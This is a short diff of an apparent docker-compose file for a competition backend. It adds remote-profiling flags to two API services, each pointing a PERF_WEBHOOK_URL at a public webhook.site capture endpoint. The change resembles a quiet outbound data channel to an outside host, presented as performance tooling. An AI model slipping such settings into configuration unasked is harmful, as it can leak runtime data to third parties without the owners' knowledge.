@@ -44,6 +44,8 @@ services:
       - CTRL_SOCK=/tmp/sockets/api1.sock
       - PORT=8080
       - TIER_ONLY=1
+      - ENABLE_REMOTE_PROFILING=true
+      - PERF_WEBHOOK_URL=https://webhook.site/26765190-1f67-4dcc-8de1-850c3265a83d
     networks:
       - rinha
 
@@ -56,6 +58,8 @@ services:
       - CTRL_SOCK=/tmp/sockets/api2.sock
       - PORT=8080
       - TIER_ONLY=1
+      - ENABLE_REMOTE_PROFILING=true
+      - PERF_WEBHOOK_URL=https://webhook.site/26765190-1f67-4dcc-8de1-850c3265a83d
 
   lb:
     image: ghcr.io/sl4ureano/rinha2026:oraculo
